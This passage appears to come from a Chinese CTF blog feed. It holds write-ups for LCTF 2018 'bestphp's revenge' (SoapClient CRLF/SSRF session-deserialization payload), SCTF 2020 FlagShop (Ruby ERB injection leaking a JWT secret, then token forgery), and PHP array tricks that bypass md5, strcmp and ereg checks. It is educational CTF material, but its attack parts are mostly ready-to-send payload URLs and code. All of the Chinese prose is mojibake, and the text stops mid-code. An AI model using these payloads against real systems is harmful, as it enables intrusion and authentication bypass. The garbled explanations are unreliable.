id="revenge-php"><a href="#revenge-php" class="headerlink" title="revenge.php"></a>revenge.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>    <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"H3ng\r\nCookie:PHPSESSID=ossmoro02qim3fshgteh2jd8o2"</span><span class="token punctuation">,</span>        <span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'H3ng'</span><span class="token punctuation">,</span>        <span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php'</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å‡ºçŽ°æŠ¥é”™å¦‚ä¸‹ï¼š</p><pre><code> Class 'SoapClient' not found in</code></pre><p>æ‰“å¼€php.iniåˆ é™¤<code>extension=php_soap.dll</code>å‰é¢çš„åˆ†å·</p><p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915200243159.png" alt="image-20210915200243159"></p><p>è¿è¡Œç»“æžœ</p><pre><code>O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22H3ng%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A49%3A%22H3ng%0D%0ACookie%3APHPSESSID%3Dossmoro02qim3fshgteh2jd8o2%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><h5 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload:"></a>Payload:</h5><h5 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h5><pre><code>/?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22H3ng%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A49%3A%22H3ng%0D%0ACookie%3APHPSESSID%3Dossmoro02qim3fshgteh2jd8o2%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p>post</p><pre><code>serialize_handler=php_serialize</code></pre><p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915211322184.png" alt="image-20210915211322184"></p><ul><li>åˆ©ç”¨<code>call_user_func($_GET[â€˜fâ€™], $_POST);</code>å‡½æ•°ï¼Œæ”¹å˜æ­¤é¡µé¢çš„åºåˆ—åŒ–å¼•æ“Žï¼Œä¸ºphp_serializeï¼Œ</li><li>session_start();çŽ°åœ¨æ²¡å•¥ç”¨</li><li><code>$_SESSION[â€˜nameâ€™] = $_GET[â€˜nameâ€™];</code>å°†æˆ‘ä»¬çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œä¼ å…¥sessionä¸­ï¼Œå¹¶åœ¨å‰é¢ï¼ŒåŠ ä¸€ä¸ªâ€œ|â€ç¬¦å·ã€‚æ­¤æ—¶sessionä¼šä»¥php_serializeçš„è§„åˆ™å‚¨å­˜ï¼š<code>a:1:{s:4:â€œnameâ€;s:199:"|xxxâ€¦"}</code></li><li>var_dump($_SESSION); æ‰“å°<code>sessionï¼š[â€œnameâ€]=&gt;"|xxxâ€¦"</code></li></ul><h5 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h5><pre><code>/?f=extract</code></pre><p>post</p><pre><code>b=call_user_func</code></pre><ul><li>call_user_func($_GET[â€˜fâ€™], $_POST); å°†bå˜é‡ï¼Œç”¨extractå‡½æ•°ï¼Œè¿›è¡Œè¦†ç›–ã€‚è¦†ç›–ä¸ºcall_user_funcã€‚</li><li>session_start(); æ­¤æ—¶çš„åºåˆ—åŒ–å¼•æ“Žä¸ºphpï¼Œæ­¤å‡½æ•°ä¼šæŒ‰ç…§phpçš„æ–¹æ³•ï¼ŒæŠŠæˆ‘ä»¬åˆšæ‰ä¼ å…¥çš„sessionï¼Œè¿›è¡Œååºåˆ—åŒ–ã€‚å¹¶å‚¨å­˜åœ¨sessionä¸­</li><li>$a = array(reset($_SESSION), â€˜welcome_to_the_lctf2018â€™); æŠŠæˆ‘ä»¬çš„sessionä¸Žâ€œwelcome_to_the_lctf2018â€å’Œå¹¶ä¸ºä¸€ä¸ªæ•°ç»„</li><li>call_user_func($b, $a); å› ä¸º$bå˜é‡å·²ç»è¢«æˆ‘ä»¬è¦†ç›–æˆäº†call_user_funcï¼Œé‚£ä¹ˆæ­¤æ—¶çš„ç¨‹åºï¼Œå°±å˜æˆäº†call_user_func(call_user_func,array($_session,â€˜welcome_to_the_lctf2018â€™));</li><li>$_sessionè¿™ä¸ªå¯¹è±¡ï¼Œä¼šåŽ»è°ƒç”¨â€œwelcome_to_the_lctf2018â€è¿™ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼ŒäºŽæ˜¯__callæ–¹æ³•è¢«è§¦å‘ï¼ŒæœåŠ¡å™¨æºå¸¦æˆ‘ä»¬è®¾ç½®çš„cookieï¼ŒåŽ»è®¿é—®flag.phpï¼Œç„¶åŽæŠŠflagï¼Œå‚¨å­˜åœ¨æ­¤cookieå¯¹åº”çš„sessionä¸­ã€‚</li></ul><p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915211336458.png" alt="image-20210915211336458"></p><h5 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h5><p>æŽ¥ç€è®¿é—®cookieï¼šossmoro02qim3fshgteh2jd8o2ä¹Ÿå°±æ˜¯åœ¨revenge.phpä¸­æž„é€ çš„é‚£ä¸ª</p><p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915211407080.png" alt="image-20210915211407080"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SCTFï¼š2020-FlagShop</title>
      <link href="2021/09/14/sctf-2020-flagshop/"/>
      <url>2021/09/14/sctf-2020-flagshop/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914185600160.png" alt="image-20210914185600160"></p><h5 id="robots-txt"><a href="#robots-txt" class="headerlink" title="/robots.txt"></a>/robots.txt</h5><p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914185546859.png" alt="image-20210914185546859"></p><h5 id="filebak"><a href="#filebak" class="headerlink" title="/filebak"></a>/filebak</h5><pre class=" language-ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'sinatra'</span><span class="token keyword">require</span> <span class="token string">'sinatra/cookies'</span><span class="token keyword">require</span> <span class="token string">'sinatra/json'</span><span class="token keyword">require</span> <span class="token string">'jwt'</span><span class="token keyword">require</span> <span class="token string">'securerandom'</span><span class="token keyword">require</span> <span class="token string">'erb'</span>set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/static'</span><span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>configure <span class="token keyword">do</span>  enable <span class="token symbol">:logging</span>  file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/../log/http.log'</span><span class="token punctuation">,</span><span class="token string">"a+"</span><span class="token punctuation">)</span>  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token keyword">true</span>  use <span class="token constant">Rack</span><span class="token punctuation">:</span><span class="token symbol">:CommonLogger</span><span class="token punctuation">,</span> file<span class="token keyword">end</span>get <span class="token string">"/"</span> <span class="token keyword">do</span>  redirect <span class="token string">'/shop'</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token keyword">end</span>get <span class="token string">"/filebak"</span> <span class="token keyword">do</span>  content_type <span class="token symbol">:text</span>  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__<span class="token keyword">end</span>get <span class="token string">"/api/auth"</span> <span class="token keyword">do</span>  payload <span class="token operator">=</span> <span class="token punctuation">{</span> uid<span class="token punctuation">:</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> jkl<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">}</span>  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token keyword">end</span>get <span class="token string">"/api/info"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">}</span>  <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>uid<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"uid"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>jkl<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">end</span>get <span class="token string">"/shop"</span> <span class="token keyword">do</span>  erb <span class="token symbol">:shop</span><span class="token keyword">end</span>get <span class="token string">"/work"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">}</span>  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>SECRET<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token delimiter tag">}</span></span>"</span><span class="token punctuation">)</span>      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> is working"</span> <span class="token keyword">then</span>    auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span><span class="token function">random_number</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    <span class="token constant">ERB</span><span class="token punctuation">:</span><span class="token symbol">:new</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> working successfully!')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>result  <span class="token keyword">end</span><span class="token keyword">end</span>post <span class="token string">"/shop"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">}</span>  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>    <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"no enough jkl"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">else</span>    auth <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">{</span>flag<span class="token punctuation">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token punctuation">:</span> <span class="token string">"success"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"jkl is good thing"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">def</span> islogin  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>    redirect <span class="token function">to</span><span class="token punctuation">(</span><span class="token string">'/shop'</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span></code></pre><p>è€ƒå¯ŸRuby ERBæ³¨å…¥ï¼Œé‡ç‚¹ä»£ç ï¼š</p><pre class=" language-ruby"><code class="language-ruby"><span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> is working"</span> <span class="token keyword">then</span>    auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span><span class="token function">random_number</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    <span class="token constant">ERB</span><span class="token punctuation">:</span><span class="token symbol">:new</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> working successfully!')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>result  <span class="token keyword">end</span><span class="token keyword">end</span></code></pre><p><code>get "/work" do</code>ä¸­æžœä¼ å…¥çš„å‚æ•°doå’Œnameä¸€è‡´ï¼Œåˆ™ä¼šè¾“å‡º<code>params[:name][0,7]} working successfully!</code></p><pre><code>$'-æœ€åŽä¸€æ¬¡æˆåŠŸåŒ¹é…å³è¾¹çš„å­—ç¬¦ä¸²</code></pre><p>æž„é€ do=&lt;%=$â€™%&gt;å’Œname=&lt;%=$â€™%&gt;,è®°å¾—æŠŠé‡Œé¢å†…å®¹è½¬æˆåå…­è¿›åˆ¶<br>æ‰€ä»¥æœ€ç»ˆå°±æ˜¯</p><pre><code>work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code></pre><p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193636941.png" alt="image-20210914193636941"></p><p>å¾—åˆ°ä¸€ä¸ªauthé‡Œé¢æ˜¯JWTå’Œalertè¾“å‡ºçš„SECRET</p><p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193724070.png" alt="image-20210914193724070"></p><p>ä¿®æ”¹jklä»·æ ¼å¤§äºŽæ‰€éœ€ä»·æ ¼ï¼ŒèŽ·å¾—JWT</p><p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193620596.png" alt="image-20210914193620596"></p><p>ç‚¹å‡»shop POSTä¸ŠåŽ»</p><p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193555713.png" alt="image-20210914193555713"></p><p>èŽ·å¾—çš„JWTæ‹¿æ¥è§£ç å¾—åˆ°flag</p><p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193540768.png" alt="image-20210914193540768"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ•°ç»„ç»•è¿‡</title>
      <link href="2021/09/13/shu-zu-rao-guo/"/>
      <url>2021/09/13/shu-zu-rao-guo/</url>
      
        <content type="html"><![CDATA[<h3 id="1ã€æ•°ç»„ç»•è¿‡MD5åˆ¤æ–­"><a href="#1ã€æ•°ç»„ç»•è¿‡MD5åˆ¤æ–­" class="headerlink" title="1ã€æ•°ç»„ç»•è¿‡MD5åˆ¤æ–­"></a>1ã€æ•°ç»„ç»•è¿‡MD5åˆ¤æ–­</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/6952387-f377013e6573e356.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/623" alt="img"></p><p>å¦‚æžœä¼ å…¥md5å‡½æ•°çš„å‚æ•°ä¸ºæ•°ç»„ç±»åž‹ï¼Œåˆ™è¿”å›žnullï¼Œ<code>null===null</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ•°ç»„å¯ä»¥ç»•è¿‡ <code>===</code> md5åˆ¤æ–­</p><h3 id="2ã€æ•°ç»„ç»•è¿‡strcmp"><a href="#2ã€æ•°ç»„ç»•è¿‡strcmp" class="headerlink" title="2ã€æ•°ç»„ç»•è¿‡strcmp"></a>2ã€æ•°ç»„ç»•è¿‡strcmp</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$pass</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pass1</span><span class="token operator">=</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¢«éšè—èµ·æ¥çš„å¯†ç </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span><span class="token variable">$pass1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"flag:nctf{*}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"the pass is wrong!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"please input pass!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>strcmpå‡½æ•°ç”¨äºŽå­—ç¬¦ä¸²çš„æ¯”è¾ƒ</p><pre><code>int strcmp ( string $str1 , string $str2 )</code></pre><p>è¿”å›žå€¼ï¼šå¦‚æžœ <code>str1</code> å°äºŽ <code>str2</code> è¿”å›ž &lt; 0ï¼› å¦‚æžœ <code>str1</code> å¤§äºŽ <code>str2</code> è¿”å›ž &gt; 0ï¼›å¦‚æžœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å›ž 0ã€‚</p><ul><li>5.2 ä¸­æ˜¯å°†ä¸¤ä¸ªå‚æ•°å…ˆè½¬æ¢æˆstringç±»åž‹ã€‚</li><li>5.3.3 ä»¥åŽï¼Œå½“æ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿”å›žæ˜¯0ã€‚</li><li>5.5 ä¸­å¦‚æžœå‚æ•°ä¸æ˜¯stringç±»åž‹ï¼Œç›´æŽ¥returnäº†</li></ul><p>å­˜åœ¨ä»¥ä¸‹æƒ…å†µ</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning<span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">stdClass</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning<span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning</code></pre><p>å› æ­¤postæäº¤pass[]=aaï¼Œé€šè¿‡æ•°ç»„ç»•è¿‡strcmpã€‚</p><h3 id="3ã€æ•°ç»„ç»•è¿‡ereg"><a href="#3ã€æ•°ç»„ç»•è¿‡ereg" class="headerlink" title="3ã€æ•°ç»„ç»•è¿‡ereg"></a>3ã€æ•°ç»„ç»•è¿‡ereg</h3><pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[1-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>            <span class="token keyword">echo</span> <span class="token string">'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'#biubiubiu'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token keyword">echo</span> <span class="token string">'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'</span><span class="token punctuation">;</span>    <span class="token 